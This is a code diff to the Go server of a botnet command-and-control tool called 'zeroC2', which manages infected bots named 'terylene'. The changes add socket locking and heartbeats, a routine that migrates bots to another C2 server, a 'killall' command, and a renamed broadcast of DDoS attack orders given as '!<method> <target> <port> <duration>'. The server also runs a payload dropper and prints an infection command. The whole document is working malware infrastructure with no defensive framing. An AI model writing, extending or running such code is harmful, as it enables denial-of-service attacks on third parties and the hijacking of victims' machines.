@@ -9,9 +9,10 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
+	"sync"
 	config "terylene/config"
 	dropper "terylene/server/components/dropper"
-	transfer "terylene/server/components/transfer"
+	"terylene/server/components/transfer"
 	poly "terylene/server/theme/default"
 	"time"
 
@@ -31,25 +32,34 @@ var (
 	connIDs     = make(map[string]string)
 	tera        = make(map[string]Botstruc)
 	aliveclient = make(map[string]time.Time)
+	pubmutex    sync.Mutex
+	routmutex   sync.Mutex
 )
 
-func broadcaster(message, broadcastmsg string, socket *zmq.Socket) {
-	fmt.Println(message)
-	_, err := socket.Send(fmt.Sprintf(message), 1)
-	fmt.Println(err)
-	fmt.Println(message)
-	fmt.Println(broadcastmsg)
+func broadcaster(message, bot string, publisher *zmq.Socket) {
+	pubmutex.Lock()
+	publisher.Send(fmt.Sprintf("%s:%s", bot, message), 1)
+	pubmutex.Unlock()
 }
 
-func heartbeatsend(router *zmq.Socket) {
+func heartroutsend(router *zmq.Socket) {
 	for {
 		for id := range connIDs {
+			routmutex.Lock()
 			router.SendMessage(id, "h")
+			routmutex.Unlock()
 		}
-
 		time.Sleep(2 * time.Second)
 	}
 }
+
+func heartpubsend(publisher *zmq.Socket) {
+	for {
+		broadcaster("h", "terylene", publisher)
+		time.Sleep(2 * time.Second)
+	}
+}
+
 func heartbeatcheck() {
 	for {
 		for id, last := range aliveclient {
@@ -95,7 +105,9 @@ func routerhandle(router *zmq.Socket) {
 			if len(msg) == 7 {
 				if msg[1] == "reg" {
 					if ExistsInMap(connIDs, msg[6]) {
+						routmutex.Lock()
 						router.SendMessage(msg[0], "kys")
+						routmutex.Unlock()
 					} else {
 						bot := Botstruc{
 							arch:    msg[2],
@@ -106,7 +118,9 @@ func routerhandle(router *zmq.Socket) {
 						}
 						tera[msg[0]] = bot
 						connIDs[msg[0]] = msg[6]
+						routmutex.Lock()
 						router.SendMessage(msg[0], "terylene", config.Broadcastport)
+						routmutex.Unlock()
 					}
 				}
 			}
@@ -116,9 +130,13 @@ func routerhandle(router *zmq.Socket) {
 					if msg[1] == "h" {
 						aliveclient[msg[0]] = time.Now()
 					} else if msg[1] == "injustice" {
+						routmutex.Lock()
 						router.SendMessage(msg[0], "justice")
+						routmutex.Unlock()
 					} else if msg[1] == "isdone" {
+						routmutex.Lock()
 						router.SendMessage(msg[0], "isserved")
+						routmutex.Unlock()
 					}
 				}
 			}
@@ -127,6 +145,53 @@ func routerhandle(router *zmq.Socket) {
 	}
 }
 
+func transferprompt(router *zmq.Socket, scanner *bufio.Scanner) {
+	if len(aliveclient) == 0 {
+		fmt.Println("you dont have any online bots sadly :(")
+		return
+	}
+	fmt.Printf("target server:")
+	scanner.Scan()
+	target := strings.TrimSpace(scanner.Text())
+
+	fmt.Printf("router port:")
+	scanner.Scan()
+	rport := strings.TrimSpace(scanner.Text())
+
+	fmt.Printf("amount of terylene to transfer:")
+	scanner.Scan()
+	amount := strings.TrimSpace(scanner.Text())
+
+	intamount, err := strconv.Atoi(amount)
+
+	if intamount > len(aliveclient) {
+		fmt.Printf("sorry, you only have %d bots", len(aliveclient))
+	}
+	if err != nil {
+		fmt.Println("botnet input is invalid")
+		return
+	}
+	err = transfer.Transfercheck(target, rport)
+	if err != nil {
+		fmt.Println("Server check failed, stopped transfer")
+	} else {
+		fmt.Printf("server check passed, initiating transfer of %d botnets\n", intamount)
+		count := 0
+		for id := range aliveclient {
+			routmutex.Lock()
+			router.SendMessage(id, "migrate", target, rport)
+			fmt.Println(connIDs)
+			fmt.Println(connIDs[id])
+			routmutex.Unlock()
+			delete(aliveclient, id)
+			delete(tera, id)
+			if count == intamount {
+				break
+			}
+		}
+		fmt.Println("operation successful!!!")
+	}
+}
 func getpubIp() string {
 	url := "https://api.ipify.org?format=text"
 	resp, err := http.Get(url)
@@ -140,12 +205,15 @@ func getpubIp() string {
 	}
 	return string(ip)
 }
+
 func main() {
+	scanner := bufio.NewScanner(os.Stdin)
+
 	title := poly.Title
 	help := poly.Help
 	methods_list := poly.Methods
 	cmdtext := poly.Cmd
-	broadcastmsg := poly.Broadcastmsg
+	Ddosmsg := poly.Ddosmsg
 	terminalcolor := color.New(color.FgCyan).Add(color.BgHiBlack)
 
 	clearScreen()
@@ -156,7 +224,6 @@ func main() {
 
 	color.Cyan("[...]starting zeroC2 broadcast server")
 
-	scanner := bufio.NewScanner(os.Stdin)
 	publisher, err := zmq.NewSocket(zmq.PUB)
 
 	defer publisher.Close()
@@ -174,6 +241,7 @@ func main() {
 		color.Red("[X] error binding port %s", config.Broadcastport)
 		os.Exit(1)
 	}
+
 	time.Sleep(50 * time.Millisecond)
 	color.Green("[✔] successfully started zeroC2 broadcast")
 	time.Sleep(50 * time.Millisecond)
@@ -194,7 +262,9 @@ func main() {
 		color.Red("[X] error binding port %s", config.Routerport)
 		os.Exit(1)
 	}
-	go heartbeatsend(router)
+
+	go heartroutsend(router)
+	go heartpubsend(publisher)
 	go heartbeatcheck()
 
 	color.Green("[✔] successfully started zeroC2 router")
@@ -202,11 +272,12 @@ func main() {
 	color.Cyan("[...]starting zeroC2 dropper")
 	go dropper.Dropstart()
 	color.Green("[✔] successfully started zeroC2 dropper")
+
 	fmt.Print("press enter to continue...")
 	scanner.Scan()
 
 	clearScreen()
-	fmt.Println(poly.Welcome)
+	fmt.Print(poly.Welcome)
 	go routerhandle(router)
 
 	for {
@@ -219,7 +290,6 @@ func main() {
 			fmt.Println("an error has occured", scanner.Err())
 			break
 		}
-
 		switch command {
 		case "help":
 			fmt.Println(help)
@@ -232,7 +302,6 @@ func main() {
 			color.Red("[✔] successfully shutdown broadcast")
 			router.Close()
 			color.Red("[✔] successfully shutdown router")
-
 			os.Exit(1)
 		case "methods":
 			fmt.Println(methods_list)
@@ -250,47 +319,11 @@ func main() {
 			}
 			fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
 		case "transfer":
-			if len(aliveclient) == 0 {
-				fmt.Println("you dont have any online bots sadly :(")
-				continue
-			}
-			fmt.Printf("target server:")
-			scanner.Scan()
-			target := strings.TrimSpace(scanner.Text())
-
-			fmt.Printf("router port:")
-			scanner.Scan()
-			rport := strings.TrimSpace(scanner.Text())
-
-			fmt.Printf("amount of terylene to transfer:")
-			scanner.Scan()
-			amount := strings.TrimSpace(scanner.Text())
-
-			intamount, err := strconv.Atoi(amount)
-
-			if intamount > len(aliveclient) {
-				fmt.Printf("sorry, you only have %d bots", len(aliveclient))
-			}
-			if err != nil {
-				fmt.Println("botnet input is invalid")
-				continue
-			}
-			err = transfer.Transfercheck(target, rport)
-			if err != nil {
-				fmt.Println("Server check failed, stopped transfer")
-			} else {
-				fmt.Printf("server check passed, initiating transfer of %d botnets\n", intamount)
-				count := 0
-				for id := range aliveclient {
-					router.SendMessage(id, "migrate", target, rport)
-					delete(aliveclient, id)
-					delete(tera, id)
-					if count == intamount {
-						break
-					}
-				}
-				fmt.Println("operation successful!!!")
-			}
+			transferprompt(router, scanner)
+		case "killall":
+			broadcaster(command, "terylene", publisher)
+			clearScreen()
+			fmt.Println("All terylene connection killed")
 		}
 		if strings.Contains(command, "!") {
 			containsBlocked := false
@@ -314,9 +347,9 @@ func main() {
 						if err != nil {
 							continue
 						}
-						_, err = publisher.Send(fmt.Sprintf("terylene:%s", command), 0)
+						broadcaster(command, "terylene", publisher)
 						clearScreen()
-						fmt.Println(broadcastmsg)
+						fmt.Println(Ddosmsg)
 					} else {
 						fmt.Println("format: !<method> <target> <port> <duration>")
 					}
